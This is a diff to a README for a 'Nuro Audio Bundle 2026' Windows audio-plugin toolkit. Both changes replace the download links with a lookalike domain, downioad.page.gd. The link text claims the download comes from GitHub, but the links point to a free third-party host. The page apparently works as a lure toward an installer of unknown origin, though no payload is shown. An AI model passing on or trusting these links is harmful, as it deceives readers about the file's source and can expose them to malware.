@@ -2,7 +2,7 @@
 
 Welcome to the Nuro Audio Bundle 2026, your ultimate solution for managing and enhancing audio plugins on Windows. This toolkit provides a seamless experience for audio enthusiasts and professionals, offering a centralized hub for all your plugin needs. With Nuro Audio Bundle, you can optimize performance, update plugins effortlessly, and customize your audio setup for an unparalleled audio production workflow.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -78,7 +78,7 @@ A5: No, Nuro Audio Bundle prioritizes your privacy. All data is stored locally o
 
 For the latest version of Nuro Audio Bundle, please visit the official download page. This ensures you get the most recent updates and features.
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ## Contact & Support
 
